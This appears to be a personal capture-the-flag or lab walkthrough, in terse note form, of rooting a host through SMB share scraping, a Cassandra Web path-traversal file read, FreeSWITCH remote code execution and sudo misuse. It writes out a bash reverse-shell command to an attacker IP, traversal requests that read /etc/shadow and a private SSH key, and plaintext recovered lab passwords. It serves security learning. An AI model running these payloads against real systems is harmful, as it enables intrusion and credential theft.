nmap shows ports 22, 80 web, 139, 445, 3000 web, 8021 freeswitch


nxc smb IP -u '' -p '' --shares works, with read access on web backup dir
So we spider it, in hopes of finding some config file

`echo -n "smbget -U ''%'' " ;for line in $(cat tb_downloaded); do echo -n "smb://192.168.196.240/backup/$line " ; done`

for all the scraping, we find
```
hash.conf.xml:4:	<!-- <remote name="Test1" host="10.0.0.10" port="8021" password="ClueCon"
vars.xml:15:  <X-PRE-PROCESS cmd="set" data="default_password=1234"/>
vars.xml:394:  <X-PRE-PROCESS cmd="set" data="default_provider_password=password"/>
amqp.conf.xml:9:	  <param name="password" value="guest"/>
The default users all have *very* simple passwords for SIP credentials and voicemail. If you put those into a production system then you are either brave, ignorant, or stupid. Please don't be any of those three things! You have a few choices for handling your users:
```

port 80 - not authorized
port 3000 - some cluster webpage, with CQL
Googled it, to find it is Cassandra Query Language, also a POC for remote file read linux/webapps/49362.py it works!
viewing the /etc/passwd shows cassie and anthony
but no id_rsa, id_ecdsa
Following the exploit, we try to get `/proc/self/cmdline` 
This contains creds for auth to the running apache cassandra database server as
```
/usr/bin/ruby2.7/usr/local/bin/cassandra-web--usernameadmin--passwordP@ssw0rd
```
and creds : ucassie : pSecondBiteTheApple330

Then there is a freeSwitch exploit, but it was failing due to authentication. Now that we know the creds, we can retry
But the creds dint work for this either

HINT TAKEN - turns out `/etc/freeswitch/autoload_configs/event_socket.conf.xml` has another password.

we use the remote file read vuln to get this, and uncover new password, StrongClueConEight021

We use this new password for cassandra rce exploit
`python freeswitch.py 192.168.196.240 "bash -c 'bash -i >& /dev/tcp/192.168.45.156/80 0>&1'"` finally gives us a reverse shell
freeswitch!

---
we `su cassie` with the password we had discovered earlier SecondBiteTheApple330
and we cassie!

---
sudo -l shows we can run /usr/bin/cassandra-web
It is a ruby script

Internal listening port 9042, `cd etc; grep -R 9042 . 2>/dev/null`
And, there is an id_rsa in cassie's home (not in .ssh)

Anyways, since cassie is allowed to run cassandra web as root, we can use the same file read exploit to read root-level files. Analyzing the exploit, we see it is a simple dir traversal.
So, we run cassandra web
```zsh
sudo /usr/local/bin/cassandra-web
#it says we need user and pass
sudo /usr/local/bin/cassandra-web -u cassie -p SecondBiteTheApple330
#It fails, since default port 3000 is already up and running
sudo /usr/local/bin/cassandra-web -u cassie -p SecondBiteTheApple330 -B 0.0.0.0:1337

#now, get another rshell and
curl --path-as-is 0.0.0.0:1337/../../../../../../../../etc/passwd
#it works
curl --path-as-is 0.0.0.0:1337/../../../../../../../../etc/shadow
#tried cracking root password, but it never cracked
#we had noticed anthony was allowed to run ssh from /etc/ssh/sshd_config
curl --path-as-is 0.0.0.0:1337/../../../../../../../../home/anthony/.ssh/id_rsa
```
With this id_rsa, we try to ssh as anthony, but it doesnt work
when we ssh as root, it works, lol!
root!

---
---
---
turns out, anthony's bash history file shows he copied his id_rsa into root's place, and hence this works
How cassie got a hold of it, is the real mystery
